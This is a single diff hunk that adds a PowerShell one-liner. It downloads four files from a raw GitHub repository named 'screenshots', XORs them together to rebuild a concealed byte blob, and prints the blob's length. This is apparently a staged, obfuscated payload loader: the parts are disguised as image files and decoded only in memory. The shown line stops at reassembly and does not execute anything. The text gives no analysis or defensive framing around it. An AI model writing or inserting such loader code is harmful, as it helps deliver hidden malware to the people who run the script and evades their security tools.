@@ -1,0 +1,1 @@
+$c=New-Object Net.WebClient;$ch=@();0..3|%{$ch+=$c.DownloadData('https://raw.githubusercontent.com/cem324/screenshots/main/c'+$_)};$x=[byte[]]$ch[0].Clone();1..3|%{$i=$_;0..($x.Length-1)|%{$x[$_]=$x[$_]-bxor$ch[$i][$_]}};Write-Host $x.Length
